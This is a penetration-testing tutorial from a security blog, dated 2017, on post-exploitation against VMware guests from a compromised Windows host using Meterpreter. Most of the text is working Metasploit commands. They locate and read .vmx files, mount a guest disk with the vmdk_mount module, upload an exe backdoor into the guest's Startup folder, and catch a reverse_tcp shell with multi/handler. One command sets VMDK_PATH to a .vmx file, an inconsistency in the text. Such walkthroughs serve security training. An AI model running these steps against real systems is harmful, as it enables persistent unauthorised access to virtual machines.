<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/penetration-testing/" rel="category tag">Penetration Testing</a></span>            </div>
            <h1 class="post-title entry-title">Post Exploitation in VMware Files with Meterpreter</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/post-exploitation-in-vmware-files-with-meterprter/" rel="bookmark"><time class="entry-date published" datetime="2017-10-10T17:26:49+00:00">October 10, 2017</time><time class="updated" datetime="2025-05-27T12:03:31+00:00">May 27, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Today you will learn How to exploit any Operation System running inside a virtual machine.</span></p>
<p><span style="color: #000000;"><strong>Requirements</strong></span></p>
<ul>
<li><strong><span style="color: #000000;">Attacker: </span></strong><span style="color: #000000;">Kali Linux</span></li>
<li><strong><span style="color: #000000;">Target: </span></strong><span style="color: #000000;">VM image windows server 2012</span></li>
</ul>
<p><span style="color: #000000;">First, the attacker needs to exploit the actual operating system of the victim PC and attain the meterpreter session with admin privileges.</span></p>
<p><span style="color: #000000;">From the given image you can perceive I have seized a windows 10 meterpreter session and also gained its admin privileges. </span></p>
<pre class="lang:default decode:true">meterpreter &gt; sysinfo</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-k7_EtzgvCZc/Wdz_Xw_jEOI/AAAAAAAAR5o/Mpruavj9fGkQnh-DOPk-tyEukwHrzFdkACLcBGAs/s1600/1.png"/></span></p>
<p><span style="color: #000000;">When you install any operating system in your VMware workstation, all of its hardware and network setting get stored as a .vmx file in the actual operating system in order to create a new virtual image.</span></p>
<p><span style="color: #000000;">Type following for making the search of .vmx file stored in it</span></p>
<pre class="lang:default decode:true">meterpreter &gt; search –f *.vmx –r</pre>
<p><span style="color: #000000;">From the given image you can perceive that it has dumped all location where .vmx files are stored.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-fGf-sqlmxNY/Wdz_YdQkgOI/AAAAAAAAR5w/2TG7RWe2phkRMlL2s-1Bq8z6btRJVgbQgCLcBGAs/s1600/2.png"/></span></p>
<p><span style="color: #000000;">Using cat command you can read the content of the file as these file simple text document which contains VMware setting information.</span></p>
<pre class="lang:default decode:true">meterpreter &gt; cat "d:/VM/windows-server-2012/windows Server 2012/windows Server 2012.vmx"</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-lbvbKPaUF-A/Wdz_YNXUvjI/AAAAAAAAR5s/cTOuyns9YxgfAMYFOmgO0Bycgr69_QZVgCLcBGAs/s1600/3.png"/></span></p>
<p><span style="color: #000000;">Here from given below image, you can read the details of this file which is describing network and hardware setting.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-qZl6zowcejQ/Wdz_YbFTLNI/AAAAAAAAR50/BMLodAm6LocZ7waXtvazV3w5XWwMMWMHwCLcBGAs/s1600/4.png"/></span></p>
<p><span style="color: #000000;">This module mounts a .vmdk file (Virtual Machine Disk) on a drive provided by the user by taking advantage of the vstor2 device driver (VMware). First, it executes the binary vixDiskMountServer.exe to access the device and then it sends certain control code via DeviceIoControl to mount it. Use the write mode with extreme care. You should only open a disk file in writable mode if you know for sure that no snapshots or clones are linked from the file.</span></p>
<pre class="lang:default decode:true">use post/windows/manage/vmdk_mount
msf post(vmdk_mount) &gt; set DEL_LCK true
msf post(vmdk_mount) &gt; set READ_MODE false
msf post(vmdk_mount) &gt; set session 2
msf post(vmdk_mount) &gt; set VMDK_PATH "d:/VM/windows-server-2012/windows Server 2012/windows Server 2012.vmx"
msf post(vmdk_mount) &gt; run</pre>
<p><span style="color: #000000;"><strong>Great!!</strong> We have successfully mount the vmdk file of Windows Server 2012.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-BR6h4Ib-yLU/Wdz_YuEOOcI/AAAAAAAAR54/8JWiEsSlIlY3fEAgbuGlySSygzLMukQtwCLcBGAs/s1600/5.png"/></span></p>
<pre class="lang:default decode:true">meterpreter &gt; show_mount</pre>
<p><span style="color: #000000;">Now from given below image, you can read the information of each drive.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-y7RncNP14CU/Wdz_Y9V00jI/AAAAAAAAR58/vWM-uWahCL0DMgYTS59CfcB5n7iR25mCACLcBGAs/s1600/6.png"/></span></p>
<p><span style="color: #000000;">Now using given below command I will upload an exe backdoor in <strong>L:</strong> <strong>drive </strong>which will give us reverse connection of windows server 2012 when it will be running inside VM workstation.</span></p>
<pre class="lang:default decode:true">meterpreter &gt; upload /root/Desktop/abc.exe "L:/ProgramData/Microsoft/Windows/Start Menu/Programs/Startup"</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-BdLj42z3UD4/Wdz_YzHblVI/AAAAAAAAR6A/VCEIbGe08oEtE9i00a1EB8dPpBcap0W4gCLcBGAs/s1600/7.png"/></span></p>
<pre class="lang:default decode:true">use exploit/multi/handler
msf exploit(handler) &gt;set payload windows/meterpreter/reverse_tcp
msf exploit(handler) &gt;set lhost 192.168.1.113
msf exploit(handler) &gt;set lport 4455
msf exploit(handler) &gt;run</pre>
<p><span style="color: #000000;"><strong>Awesome!! </strong>We have successfully exploited Windows Server 2012 virtual machine and gained its meterpreter session.</span></p>
<pre class="lang:default decode:true">meterpreter &gt; sysinfo</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-UJzOHqCpthc/Wdz_ZQq4_bI/AAAAAAAAR6E/fbST_0KCyz8VmpX8L8TtUGYDV5ENyUr5gCLcBGAs/s1600/8.png"/></span></p>
<p><span style="color: #000000;"><strong>Source: </strong>http://www.shelliscoming.com/2017/05/post-exploitation-mounting-vmdk-files.html</span></p>
<p><span style="color: #000000;"><strong>Author</strong>: Sanjeet Kumar is an Information Security Analyst | Pentester | Researcher  Contact <a class="broken_link" href="https://www.linkedin.com/in/sanjeet-kumar-27828058/"><strong>Here</strong></a></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
